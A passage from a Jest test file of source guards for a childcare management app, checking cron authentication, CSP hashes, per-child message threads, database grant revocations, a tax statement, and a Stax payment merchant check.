        expect(reconcileFn.includes('releaseBeforeMs')).toBe(true);
    });

    test('the release-window comparison uses numeric timestamps, not raw string comparison', () => {
        // A DB-returned timestamp string and a JS toISOString() string can
        // format offsets differently ("+00:00" vs "Z"), which breaks a plain
        // string `<` comparison at the boundary. Must compare as epoch ms.
        expect(reconcileFn.includes('new Date(lock.updated_at).getTime() < releaseBeforeMs')).toBe(true);
    });

    test('scheduled via cron, service role key never committed to the migration', () => {
        const schedule = readMigration('schedule_stax_reconciliation');
        expect(schedule.includes("cron.schedule(\n  'reconcile-stax-payments'")).toBe(true);
        expect(schedule.includes('{SERVICE_ROLE_KEY}')).toBe(true);
        expect(/sb_secret_|sb_[a-z]+_[A-Za-z0-9_-]{20,}/.test(schedule)).toBe(false);
    });
});

describe('scheduled jobs report partial delivery failures honestly', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');

    test('day summaries return a failing status when any family push fails', () => {
        const source = read('supabase/functions/send-day-summary/index.ts');
        expect(source.includes('failed++')).toBe(true);
        expect(source.includes('failed ? 502 : 200')).toBe(true);
    });

    test('photo cleanup exposes orphaned-object deletion failures', () => {
        const source = read('supabase/functions/sweep-child-photos/index.ts');
        expect(source.includes('failed += chunk.length')).toBe(true);
        expect(source.includes('failed ? 502 : 200')).toBe(true);
    });

    test('waitlist reminders advance state only after confirmed email delivery', () => {
        const source = read('supabase/functions/send-waitlist-reminders/index.ts');
        const deliveryBlock = source.slice(
            source.indexOf('const reminderResponse'),
            source.indexOf('// Weekly digest')
        );
        expect(deliveryBlock.indexOf('if (!reminderResponse?.ok)')).toBeLessThan(
            deliveryBlock.indexOf('last_reminder_sent_at')
        );
        expect(source.includes('failed ? 502 : 200')).toBe(true);
    });

    test('clock alerts do not write their dedupe record after a failed notification', () => {
        const source = read('supabase/functions/check-missed-clocks/index.ts');
        expect(source.includes('if (!pushResponse.ok) throw')).toBe(true);
        expect(source.includes('if (!emailResponse.ok) throw')).toBe(true);
        expect(source.includes('sent === alerts.length ? 200 : 502')).toBe(true);
    });
});

describe('scheduled jobs use a scoped cron credential', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const jobs = [
        'check-missed-clocks', 'send-waitlist-reminders', 'sweep-child-photos',
        'send-day-summary', 'reconcile-stax-payments', 'backfill-stax-processor-fees',
    ];

    test('every scheduled function authenticates through the shared cron guard', () => {
        for (const job of jobs) {
            const source = read(`supabase/functions/${job}/index.ts`);
            expect(source.includes('isAuthorizedCronRequest(req)')).toBe(true);
        }
    });

    test('cron secret comparison is constant-time and never logs the secret', () => {
        // The comparison itself now lives in the shared safeEqual() helper (also used by
        // stax-webhook and finance-summary) -- cron-auth.ts delegates to it rather than
        // reimplementing it, so check both: that cron-auth.ts actually delegates, and that the
        // shared implementation is still hash-based/constant-time and never logs.
        const cronAuth = read('supabase/functions/_shared/cron-auth.ts');
        expect(cronAuth.includes("from \"./timing-safe.ts\"")).toBe(true);
        expect(cronAuth.includes('safeEqual(')).toBe(true);
        expect(cronAuth.includes('console.')).toBe(false);

        const timingSafe = read('supabase/functions/_shared/timing-safe.ts');
        expect(timingSafe.includes('crypto.subtle.digest')).toBe(true);
        expect(timingSafe.includes('diff |=')).toBe(true);
        expect(timingSafe.includes('console.')).toBe(false);
    });

    test('replacement cron commands read a scoped Vault secret, not a service-role JWT', () => {
        const migration = readMigration('scope_scheduled_job_credentials');
        expect(migration.includes("name = 'mymdo_cron_secret'")).toBe(true);
        expect(migration.includes("'X-Cron-Secret'")).toBe(true);
        expect(migration.includes('SERVICE_ROLE')).toBe(false);
    });
});

describe('Waitlist Planner — Grid drawer is reachable, weekday headers print once', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const wl = read('js/admin/admin-waitlist.js');

    test('the Grid renders weekday labels in a header row, not inside every cell', () => {
        // The old markup stamped a .wlp-cap-chip-day label into all five chips
        // of every room/month cell — thirty per row — which is what made the
        // table too wide to show more than two months. The header row prints
        // them once instead.
        expect(wl.includes('wlp-cap-chip-day')).toBe(false);
        expect(wl.includes('class="wlp-day-head')).toBe(true);
        expect(wl.includes('colspan="5"')).toBe(true);
    });

    test('all three Grid detail panels route through the one drawer', () => {
        // wlpRenderGridSidebar / wlpRenderDemandDrawer / wlpRenderAgeOutDrawer
        // return {title, sub, body} for the shared shell now. If one is ever
        // interpolated straight into markup again it renders "[object Object]"
        // on the page — which is exactly what happened while building this.
        const dispatch = wl.match(/function wlpDrawerContent[\s\S]*?\n}/)[0];
        ['wlpRenderGridSidebar', 'wlpRenderDemandDrawer', 'wlpRenderAgeOutDrawer']
            .forEach(fn => expect(dispatch.includes(fn)).toBe(true));
        // No caller may interpolate a drawer builder into a template literal.
        expect(/\$\{[^}]*wlpRender(Demand|AgeOut)Drawer\(/.test(wl)).toBe(false);
        expect(/\$\{[^}]*wlpRenderGridSidebar\(/.test(wl)).toBe(false);
    });

    test("closing the drawer leaves the week's child cards open", () => {
        // The roster block and the drawer are separate state on purpose:
        // wlpCloseDrawer clears the drawer selection and the rollup drawer,
        // never rosterCell, which only the roster's own ✕ clears.
        // Checks for an assignment, not a mention — the function's own comment
        // names rosterCell to explain why it is left alone.
        const close = wl.match(/function wlpCloseDrawer[\s\S]*?\n}/)[0];
        expect(/rosterCell\s*=/.test(close)).toBe(false);
        expect(close.includes('_wlp.selCellA = null')).toBe(true);
        expect(wl.includes("wlpGridRosterClose')?.addEventListener('click', () => { _wlp.rosterCell = null;")).toBe(true);
    });

    test('every queue row carries the same Enroll action as its expanded panel', () => {
        expect(wl.includes('wlp-row-enroll-btn')).toBe(true);
        // Same data attributes as the expanded footer's button, so the one
        // [data-wlp-enroll-full] listener — which stops propagation, keeping
        // the row from toggling — covers both with no extra wiring.
        const row = wl.match(/const rowEnrollBtn[\s\S]*?;\n/)[0];
        expect(row.includes('data-wlp-enroll-full=')).toBe(true);
        expect(row.includes('data-wlp-enroll-month=')).toBe(true);
    });

    test('the drawer is actually rendered and wired, not just defined', () => {
        // The lesson from the refund button that shipped into a dead section:
        // a symbol present in the bundle is not the same claim as a feature
        // the shell will ever reach.
        expect(/\$\{isGrid \? wlpRenderDrawer\(alloc\) : ''\}/.test(wl)).toBe(true);
        expect(wl.includes('wlpAttachDrawerListeners();')).toBe(true);
        expect(wl.includes('data-wlp-drawer-close')).toBe(true);
    });
});

describe('Director Report — panes are tables, and they agree with the packet', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const mk = read('js/admin/admin-market.js');
    const html = read('admin.html');

    test('no chart code or canvas is left behind on this tab', () => {
        // The panes are lists/tables now. Chart.js plumbing that no longer has
        // a caller would just imply a chart still renders somewhere here.
        ['_marketCharts', 'MARKET_COLORS', '_destroyMarketChart', 'new Chart('].forEach(sym =>
            expect(mk.includes(sym)).toBe(false));
        ['marketPositionChart', 'marketRateChart', 'marketRegFeeChart',
         'marketInfantCostChart', 'marketWageChart'].forEach(id =>
            expect(html.includes(id)).toBe(false));
    });

    test('the screen and the printed packet read the same rate cell', () => {
        // Both go through _marketRateCell, so a figure can never differ
        // between what the director reads and what she hands the board.
        const packet = mk.match(/function _openDirectorReportPacket[\s\S]*?\n}/)[0];
        expect(packet.includes('_marketRateCell(p)')).toBe(true);
        expect(/_drRateLabel\(p\.rate_low/.test(packet)).toBe(false);
    });

    test('our own weekly rate is computed from active rooms, and a typed rate wins', () => {
        const cell = mk.match(/function _marketRateCell[\s\S]*?\n}/)[0];
        // A rate on file short-circuits before the computed fallback.
        expect(cell.indexOf('p.rate_low != null')).toBeLessThan(cell.indexOf('_marketOwnWeeklyRate'));
        const own = mk.match(/function _marketOwnWeeklyRate[\s\S]*?\n}/)[0];
        expect(own.includes("r.status === 'active'")).toBe(true);
        expect(own.includes('!r.hidden')).toBe(true);
    });

    test('Flexible/Partial/Set comes from flexible_text, not a score threshold', () => {
        // flexibility_score orders the list; the text the director actually
        // types is what says whether a schedule is flexible.
        const kind = mk.match(/function _marketScheduleKind[\s\S]*?\n}/)[0];
        expect(kind.includes('flexible_text')).toBe(true);
        expect(kind.includes('flexibility_score')).toBe(false);
    });
});

describe('Planning tab nav — the two sidebar entries the director asked for', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const portal = read('js/admin/admin-portal.js');

    test('the inquiry tool is named "Waitlist Signup Link"', () => {
        expect(portal.includes("name: 'Waitlist Signup Link'")).toBe(true);
        expect(portal.includes("name: 'Waitlist Inquiries'")).toBe(false);
    });

    test('Import Waitlist from File is unreachable, and nothing links to it', () => {
        // Unreferenced by AP_TOOLS is this shell's own way of retiring a tool
        // (its <section> stays in admin.html). A dashboard panel's `tools:`
        // pill pointing at a retired key would be a dead link, so check both.
        expect(/key: 'wlImport'/.test(portal)).toBe(false);
        expect(/tools: \[[^\]]*'wlImport'/.test(portal)).toBe(false);
    });
});

describe('CSP tightening — script-src hash allowlist, no inline handlers', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const crypto = require('crypto');
    // The RAW line as it appears in _headers — including the leading
    // whitespace and "Content-Security-Policy:" label — is what counts
    // against Cloudflare's 2,000-character-per-line limit (see the dedicated
    // test below). cspValue is just the directive value, used everywhere
    // else in this block.
    const rawCspLine = read('_headers').split('\n').find(l => l.includes('Content-Security-Policy:'));
    const cspValue = rawCspLine.match(/Content-Security-Policy:\s*(.+)$/)[1];
    const scriptSrc = cspValue.match(/script-src ([^;]+);/)[1];

    test('script-src carries no unsafe-inline or unsafe-eval', () => {
        expect(scriptSrc.includes('unsafe-inline')).toBe(false);
        expect(scriptSrc.includes('unsafe-eval')).toBe(false);
    });

    test('every inline <script> block in every HTML page has a matching CSP hash', () => {
        // Drift guard: if anyone edits an inline script's content without
        // recomputing its hash, the browser will silently refuse to run it —
        // the exact "shipped half-live" failure shape this file warns about
        // elsewhere. Recompute from the real HTML and compare, the same way
        // the source-drift guard above catches a stale copied function.
        //
        // Walks the WHOLE repo, not just the root — wrangler.jsonc serves
        // `assets.directory: "."` (everything not listed in .assetsignore is
        // public), so docs/manual.html and marketing/*.html are just as live
        // under this CSP as admin.html. A root-only scan is exactly how this
        // test's first draft missed docs/manual.html's own inline handler.
        const IGNORE_DIRS = new Set(['.git', 'node_modules', '.wrangler', '.github', '.claude', 'dist']);
        const htmlFiles = [];
        (function walk(dir) {
            for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
                if (IGNORE_DIRS.has(entry.name)) continue;
                const full = path.join(dir, entry.name);
                if (entry.isDirectory()) walk(full);
                else if (entry.name.endsWith('.html')) htmlFiles.push(full);
            }
        })(repoRoot);
        // Browsers only execute a <script> as JS if its `type` is absent,
        // empty, or one of these — a data block like type="text/x-dc" (the
        // design_handoff mockups) or type="application/ld+json" (index.html's
        // SEO structured data) is inert and never gated by script-src at all.
        // Verified empirically, not assumed: a type="text/x-dc" block with
        // content matching nothing in the CSP produced zero CSP violation in
        // a real browser. Confirming this class of exclusion is what took
        // the CSP line from 1989 characters (11 short of the 2,000-char-per-
        // line limit Cloudflare's _headers enforces — see the section below)
        // down to a safer 1827.
        const JS_TYPES = new Set(['', 'text/javascript', 'application/javascript', 'text/ecmascript', 'application/ecmascript', 'module']);
        const isExecutableScriptTag = tagOpen => {
            if (/\bsrc=/.test(tagOpen)) return false;
            const typeMatch = tagOpen.match(/\btype=["']([^"']*)["']/i);
            if (!typeMatch) return true;
            return JS_TYPES.has(typeMatch[1].toLowerCase().trim());
        };
        const missing = [];
        for (const file of htmlFiles) {
            const html = fs.readFileSync(file, 'utf8');
            const re = /<script([^>]*)>([\s\S]*?)<\/script>/g;
            let m;
            while ((m = re.exec(html))) {
                if (!isExecutableScriptTag(`<script${m[1]}>`)) continue;
                const content = m[2];
                if (!content.trim()) continue;
                const hash = crypto.createHash('sha256').update(content, 'utf8').digest('base64');
                if (!scriptSrc.includes(`'sha256-${hash}'`)) missing.push(`${path.relative(repoRoot, file)}: sha256-${hash}`);
            }
        }
        expect(missing.join(', ')).toBe('');
    });

    test('the CSP line stays under Cloudflare\'s 2,000-character-per-line _headers limit', () => {
        // Found live: the first version of this line was 2,151 characters and
        // Cloudflare's Workers Build silently failed on it. Regression guard
        // with real margin, not the line at the wire — a future inline
        // script or CDN host addition should fail this test long before it
        // fails a production deploy.
        expect(rawCspLine.length < 1950).toBe(true);
    });

    test('no inline event-handler attributes remain in js/ or any HTML page (all would need unsafe-inline)', () => {
        const repoFiles = [];
        (function walk(dir) {
            for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
                if (entry.name === 'node_modules' || entry.name === 'dist' || entry.name.startsWith('.')) continue;
                const full = path.join(dir, entry.name);
                if (entry.isDirectory()) walk(full);
                else if (/\.(js|html)$/.test(entry.name)) repoFiles.push(full);
            }
        })(repoRoot);

        const pattern = /\son(click|change|submit|input|keyup|keydown|focus|blur|dblclick)=["']/;
        const offenders = repoFiles
            .filter(f => !f.endsWith('business-logic.test.js')) // this file's own pattern string is not a violation
            .filter(f => pattern.test(fs.readFileSync(f, 'utf8')))
            .map(f => path.relative(repoRoot, f));
        expect(offenders.join(', ')).toBe('');
    });
});

// ============================================================
// Per-child message threads (per_child_message_threads.sql)
// ============================================================
// Source guards, not behavioral tests: the logic that matters here lives in
// Postgres (verified against production when the migration was applied) and in
// DOM-rendering functions that cannot be require()d. What CAN drift silently is
// the wiring — which is exactly what already went wrong once on this feature's
// neighbors (a refund button shipped into a section nothing renders).
describe('per-child message threads', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');

    const migration = readMigration('per_child_message_threads');
    const portalMsg = read('js/parent/parent-messages.js');
    const supa      = read('js/supabase.js');

    test('the migration drops the one-thread-per-family constraint', () => {
        // THE enabling change. Without it a second child's thread cannot be
        // inserted at all and my_child_message_thread() fails on child two.
        expect(/drop constraint if exists message_threads_family_id_key/.test(migration)).toBe(true);
    });

    test('a family can hold one thread per child, and one general thread', () => {
        expect(/create unique index[^;]*message_threads_family_student_uidx[^;]*\(family_id, student_id\)[^;]*where student_id is not null/s
            .test(migration)).toBe(true);
        expect(/create unique index[^;]*message_threads_family_general_uidx[^;]*\(family_id\)[^;]*where student_id is null/s
            .test(migration)).toBe(true);
    });

    test('the parent RPC authorizes the child, never trusting the id', () => {
        expect(/if not parent_owns_student\(p_student_id\) then return null/.test(migration)).toBe(true);
        // anon must not reach it: a thread is family data behind a real session.
        expect(/revoke all on function public\.my_child_message_thread\(uuid\) from public, anon/.test(migration)).toBe(true);
        expect(/grant execute on function public\.my_child_message_thread\(uuid\) to authenticated/.test(migration)).toBe(true);
    });

    test('the backfill refuses to guess for a multi-child family', () => {
        // Every existing thread belonged to a single-child family when this
        // ran, but the guard is what makes replaying it safe later.
        expect(/select count\(\*\) from public\.students s2 where s2\.family_id = t\.family_id\) = 1/
            .test(migration)).toBe(true);
    });

    test('staff room scoping follows the thread\'s own child', () => {
        // A Bee Room teacher must not read a conversation about a sibling in
        // another room just because this family has someone in Bee today.
        const scoped = /t\.student_id IS NOT NULL AND st\.id = t\.student_id/;
        expect(migration.match(new RegExp(scoped, 'g')).length).toBeGreaterThan(1);
        expect(/t\.student_id IS NULL\s+AND st\.family_id = t\.family_id/.test(migration)).toBe(true);
    });

    test('the PIN-gated thread list is VOLATILE', () => {
        // staff_list_threads reaches staff_id_for_pin, which WRITES an attempt
        // row on every call. STABLE would raise 25006 on the happy path only —
        // the clock-in outage this repo already had.
        expect(/language plpgsql\n(--[^\n]*\n)*volatile\nsecurity definer/.test(migration)).toBe(true);
    });

    test('the parent app opens a per-child thread and never a sibling\'s', () => {
        expect(/rpc\('my_child_message_thread', \{\s*p_student_id: studentId/.test(supa)).toBe(true);
        // Marking read is scoped to the thread on screen. Marking every thread
        // read on open would silently clear a sibling's unread badge, which is
        // the one thing splitting the threads was meant to fix.
        expect(/await markThreadRead\(pmThreadId\)/.test(portalMsg)).toBe(true);
        expect(/pmThreadByChild\)?\.forEach[^\n]*markThreadRead/.test(portalMsg)).toBe(false);
    });

    test('the unread badge counts every child, and still marks nothing read', () => {
        expect(/async function pmRefreshUnread\(\)/.test(portalMsg)).toBe(true);
        expect(/async function pmUnreadCount\(\)/.test(portalMsg)).toBe(true);
        // pmUnreadCount must not route through the loader — that would mark
        // the thread read for a parent who never opened the tab. Read only
        // ITS OWN body: pmOpenActiveThread is declared right after it, and a
        // fixed-length slice ran straight into that function's name.
        const after = portalMsg.slice(portalMsg.indexOf('async function pmUnreadCount()'));
        const own   = after.slice(0, after.indexOf('\n}') + 2);
        expect(/pmLoad|pmOpenActiveThread|markThreadRead/.test(own)).toBe(false);
    });

    test('every reader of a thread says which child it is about', () => {
        expect(/students\(child_name\)/.test(supa)).toBe(true);                       // admin inbox
        expect(/t\.students\?\.child_name/.test(read('js/admin/admin-messages-unified.js'))).toBe(true);
        expect(/t\.child_name \|\| t\.family_name/.test(read('js/staff/staff-log.js'))).toBe(true);
        expect(/thread\.students\?\.child_name/.test(read('worker.js'))).toBe(true);  // the push
    });
});

// ============================================================
// Wrong-app redirect (my_app_home_redirect.sql)
// ============================================================
describe('non-parent sessions are sent to their own app', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('my_app_home_redirect');
    const auth = read('js/parent/parent-auth.js');

    test('parent wins over admin and staff', () => {
        // An admin or teacher who ALSO has a child enrolled is on the parent
        // portal deliberately. If this ordering ever flips they get bounced
        // out of their own child's app, which is worse than the bug it fixes.
        const parentAt = migration.indexOf('from parent_accounts pa where pa.user_id = auth.uid()');
        const adminAt  = migration.indexOf('when is_admin()');
        const staffAt  = migration.indexOf('from staff s');
        expect(parentAt > -1).toBe(true);
        expect(adminAt > parentAt).toBe(true);
        expect(staffAt > adminAt).toBe(true);
    });

    test('it takes no argument, so it cannot be pointed at anyone else', () => {
        // A function that answered "is THIS address staff?" would enumerate
        // the roster for any caller. Every branch reads the caller's own
        // session instead.
        expect(/create or replace function public\.my_app_home\(\)/.test(migration)).toBe(true);
        expect(/revoke all on function public\.my_app_home\(\) from public, anon/.test(migration)).toBe(true);
        expect(/grant execute on function public\.my_app_home\(\) to authenticated/.test(migration)).toBe(true);
    });

    test('the redirect runs before the portal shell is revealed', () => {
        const redirectAt = auth.indexOf('await portalRedirectNonParent()');
        const revealAt   = auth.indexOf("pEl('portalSignInShell')?.classList.add('hidden')");
        expect(redirectAt > -1).toBe(true);
        expect(redirectAt < revealAt).toBe(true);
        // Back must not drop them into the app they were just moved out of.
        expect(/location\.replace\('admin\.html'\)/.test(auth)).toBe(true);
        expect(/location\.replace\('staff\.html'\)/.test(auth)).toBe(true);
    });

    test('only a real failure says "retry"', () => {
        // my_schedule() returns null for a session with no family. Reporting
        // that as a load failure told the reader to retry a state no retry can
        // change — the bug this pass was opened for.
        const billing = read('js/parent/parent-billing.js');
        const sched   = read('js/parent/parent-schedule.js');
        expect(/pbLoadFailed\s*$/m.test(billing) || billing.includes('pbLoadFailed')).toBe(true);
        expect(/pbLoadFailed[\s\S]{0,120}Pull down to retry/.test(billing)).toBe(true);
        expect(/psLoadFailed[\s\S]{0,120}Pull down to retry/.test(sched)).toBe(true);
        expect(billing.includes('not linked to a family account')).toBe(true);
        expect(sched.includes('not linked to a family account')).toBe(true);
    });
});

describe('parent upload of child documents — write-only, own-child-only', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('parent_upload_child_documents');
    const supabaseJs = read('js/supabase.js');
    const portalJs = read('js/parent/parent-documents.js');
    const adminFamiliesJs = read('js/admin/admin-families.js');

    test('the storage policy grants INSERT only — no parent SELECT/UPDATE/DELETE on the bucket', () => {
        expect(migration.includes('FOR INSERT TO authenticated')).toBe(true);
        expect(/FOR (ALL|SELECT|UPDATE|DELETE) TO authenticated/.test(migration)).toBe(false);
    });

    test('the policy is scoped to the child\'s own folder via parent_owns_student(), never a bare bucket check', () => {
        const checkAt = migration.indexOf('WITH CHECK');
        expect(checkAt).toBeGreaterThan(-1);
        const checkBlock = migration.slice(checkAt);
        expect(checkBlock.includes("bucket_id = 'child-documents'")).toBe(true);
        expect(checkBlock.includes('parent_owns_student(split_part(storage.objects.name')).toBe(true);
        expect(checkBlock.includes("~ '^[0-9a-fA-F]{8}-")).toBe(true);
    });

    test('uploadChildDocumentAsParent() tags the filename so the admin list can tell it apart from an office upload', () => {
        const start = supabaseJs.indexOf('async function uploadChildDocumentAsParent');
        expect(start).toBeGreaterThan(-1);
        const fnBody = supabaseJs.slice(start, supabaseJs.indexOf('\n}', start));
        expect(fnBody.includes('${studentId}/${Date.now()}-parent-${base}.${ext}')).toBe(true);
        expect(fnBody.includes("from('child-documents')")).toBe(true);
    });

    test('the admin Family Directory documents list badges a parent-submitted file', () => {
        expect(adminFamiliesJs.includes('function _fmDocIsFromParent(name)')).toBe(true);
        expect(adminFamiliesJs.includes('/^parent-/')).toBe(true);
        expect(adminFamiliesJs.includes('From parent')).toBe(true);
    });

    test('the portal upload card is per-child and never renders a list of what was already sent', () => {
        expect(portalJs.includes('async function pdUploadDocument(input)')).toBe(true);
        expect(portalJs.includes('uploadChildDocumentAsParent(studentId, file)')).toBe(true);
        // Write-only: the section builder must never call a list/fetch of
        // existing documents back for the parent to browse.
        const sectionStart = portalJs.indexOf('function pdImmunizationSection()');
        const sectionEnd = portalJs.indexOf('\n}', portalJs.indexOf('pdUploadDocument', sectionStart));
        const sectionBody = portalJs.slice(sectionStart, sectionEnd);
        expect(sectionBody.includes('listChildDocuments')).toBe(false);
    });

    test('no inline event-handler attribute was used for the new upload inputs (CSP script-src has no unsafe-inline)', () => {
        expect(portalJs.includes('addEventListener')).toBe(true);
        expect(/\son(click|change)=["']/.test(portalJs)).toBe(false);
    });
});

describe('Schedule tab shows the invoice\'s own amount, never a second estimate beside it', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const scheduleJs = read('js/parent/parent-schedule.js');
    const migration  = readMigration('parent_read_public_settings_keys');

    test('psMonthBlock prints billing_invoices.final_amount whenever an invoice exists', () => {
        const start = scheduleJs.indexOf('function psMonthBlock(');
        expect(start).toBeGreaterThan(-1);
        const body = scheduleJs.slice(start, scheduleJs.indexOf('\nfunction psStatusPill', start));
        // The invoice figure wins; the client-side day-rate sum is the fallback.
        expect(body.includes('const billed  = inv ? Number(inv.final_amount) || 0 : total;')).toBe(true);
        // And it is that figure, not the estimate, that gets rendered.
        expect(body.includes('ps-month-bill">${psMoney(billed)}')).toBe(true);
        expect(body.includes('ps-month-bill">${psMoney(total)}')).toBe(false);
    });

    test('a month with an invoice is never labeled an estimate', () => {
        const start = scheduleJs.indexOf('function psMonthBlock(');
        const body = scheduleJs.slice(start, scheduleJs.indexOf('\nfunction psStatusPill', start));
        expect(body.includes("isBilled ? 'not sent yet' : 'estimate'")).toBe(true);
    });

    test('the shared fetch loads live room rates, so the estimate is not the build-time default', () => {
        const start = scheduleJs.indexOf('function psSchedule()');
        const body = scheduleJs.slice(start, scheduleJs.indexOf('\n}', scheduleJs.indexOf('return psPromise', start)));
        expect(body.includes('loadRateSettings')).toBe(true);
        // Best-effort: a rates failure must not take the whole tab down.
        expect(body.includes('.catch(() => false)')).toBe(true);
    });

    test('a signed-in parent can read room_rates — and only the already-public keys', () => {
        expect(migration.includes('to authenticated')).toBe(true);
        expect(migration.includes('for select')).toBe(true);
        expect(migration.includes("'room_rates'")).toBe(true);
        // Nothing beyond the anon allow-list: no admin_roles, no annual budget.
        expect(migration.includes('admin_roles')).toBe(false);
        expect(/for (all|insert|update|delete)/i.test(migration.replace(/^--.*$/gm, ''))).toBe(false);
    });
});

describe('TRUNCATE is not a grant any browser role holds', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('revoke_truncate_from_authenticated');

    test('the sweep revokes TRUNCATE from anon, authenticated AND public', () => {
        expect(migration.includes('revoke truncate on %s from anon, authenticated, public')).toBe(true);
        // Every public table, not a hand-listed set that a new table escapes.
        expect(migration.includes("where n.nspname = 'public' and c.relkind in ('r', 'p')")).toBe(true);
    });

    test('DELETE is left alone — RLS applies to it, and admin paths use it', () => {
        expect(/revoke\s+delete/i.test(migration)).toBe(false);
        expect(/revoke\s+all/i.test(migration)).toBe(false);
    });

    test('the default privilege for a NEW public table no longer carries TRUNCATE', () => {
        expect(migration.includes('alter default privileges for role postgres in schema public')).toBe(true);
        expect(migration.includes('revoke truncate on tables from anon, authenticated')).toBe(true);
    });

    test('no app code truncates anything, so nothing depended on the grant', () => {
        const files = [
            'js/supabase.js', 'js/app.js', 'worker.js',
            'js/admin/admin-billing.js', 'js/admin/admin-families.js',
        ];
        for (const f of files) {
            expect(/\btruncate\b/i.test(read(f))).toBe(false);
        }
    });
});

// ============================================================
// Childcare statement (family_care_statement.sql)
// ============================================================
// This document is filed with the IRS or handed to an employer. The guards
// below are about the two ways it could be quietly wrong: a total built from
// the wrong column, and a total covering a period the ledger cannot support.
describe('childcare statement', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('family_care_statement');
    const page = read('js/statement-print.js');

    test('total paid is money received, never money billed', () => {
        // "Paid for care" on Form 2441 means what the family actually paid.
        // Summing billing_invoices.final_amount would report what they were
        // charged, which is a different number and not the one the IRS wants.
        expect(/sum\(amount\).{0,40}from pays/s.test(migration)).toBe(true);
        expect(/from billing_payments bp/.test(migration)).toBe(true);
        expect(migration.includes('final_amount')).toBe(false);
    });

    test('the office or the family, and nobody else', () => {
        expect(/is_admin\(\) or p_family_id in \(select parent_family_ids\(\)\)/.test(migration)).toBe(true);
        expect(/revoke all on function public\.family_care_statement\(uuid, date, date\) from public, anon/.test(migration)).toBe(true);
    });

    test('every month in the period reports its own coverage', () => {
        // Production has care days in months with no payments recorded at all.
        // Without this the statement would print a confident short total.
        expect(migration.includes("'coverage'")).toBe(true);
        expect(/'care_days',[\s\S]{0,200}'payments',/.test(migration)).toBe(true);
    });

    test('the page refuses rather than issuing a wrong document', () => {
        // Two refusals, and neither may grow an override.
        expect(/function spMissingProviderFields/.test(page)).toBe(true);
        expect(/function spUncoveredMonths/.test(page)).toBe(true);
        // A month with care days and no payment is what "uncovered" means.
        expect(/care_days \|\| 0\) > 0 && \(m\.payments \|\| 0\) === 0/.test(page)).toBe(true);
        // EIN is required; the license number is genuinely optional.
        expect(/\['ein',\s*'Employer Identification Number/.test(page)).toBe(true);
        expect(page.includes("['license_no'")).toBe(false);
    });

    test('nothing invents the provider identity', () => {
        // An EIN this app made up would be filed with a tax return. The values
        // come from the provider_tax_info setting or the document does not
        // issue — there is no default anywhere.
        expect(page.includes('43-1234567')).toBe(false);   // the mockup's dummy EIN
        expect(migration.includes('43-1234567')).toBe(false);
        expect(/provider_tax_info/.test(migration)).toBe(true);
    });

    test('both the parent and the office reach the same document', () => {
        expect(read('js/parent/parent-documents.js').includes('statement-print.html')).toBe(true);
        expect(read('js/admin/admin-finance-hub.js').includes('statement-print.html')).toBe(true);
        // Same three periods on both sides.
        ['month:', 'year:', 'ytd'].forEach(tok => {
            expect(read('js/parent/parent-documents.js').includes(tok)).toBe(true);
            expect(read('js/admin/admin-finance-hub.js').includes(tok)).toBe(true);
        });
    });
});

describe('Stax merchant pin — the guard between test money and real money', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const FNS = [
        'supabase/functions/charge-stax-payment/index.ts',
        'supabase/functions/create-stax-charge/index.ts',
        'supabase/functions/admin-refund-stax-payment/index.ts',
        'supabase/functions/reconcile-stax-payments/index.ts',
        'supabase/functions/backfill-stax-processor-fees/index.ts',
    ];

    test('every function that holds the Stax API key verifies the merchant first', () => {
        for (const f of FNS) {
            const src = read(f);
            expect(src.includes('async function assertStaxMerchant(')).toBe(true);
            expect(src.includes('await assertStaxMerchant(apiKey);')).toBe(true);
            // The check must come before the key is ever used against Stax.
            const check = src.indexOf('await assertStaxMerchant(apiKey);');
            const firstUse = src.indexOf('Bearer ${apiKey}', src.indexOf('serve('));
            if (firstUse > -1) expect(check).toBeLessThan(firstUse);
        }
    });

    test('it fails CLOSED — an unreadable answer is treated like a wrong merchant', () => {
        for (const f of FNS) {
            const src = read(f);
            const start = src.indexOf('async function assertStaxMerchant(');
            const body = src.slice(start, src.indexOf('\n}', start));
            expect(body.includes('if (!actual)')).toBe(true);
            expect(body.includes('throw new Error("Could not verify the payment merchant.")')).toBe(true);
            expect(body.includes('if (actual !== expected)')).toBe(true);
            // A top-level `id` on /self is the API user, not the merchant —
            // comparing it would check the wrong thing and pass by accident.
            expect(/\bbody\?\.id\b/.test(body)).toBe(false);
        }
    });

    test('an unset STAX_MERCHANT_ID leaves behavior unchanged, so this cannot break sandbox testing', () => {
        const body = read(FNS[0]);
        expect(body.includes('if (!expected || _staxMerchantVerified) return;')).toBe(true);
    });

    test('the go-live checklist names setting it as a required step', () => {
        const doc = read('docs/STAX_GO_LIVE.md');
        expect(doc.includes('STAX_MERCHANT_ID')).toBe(true);
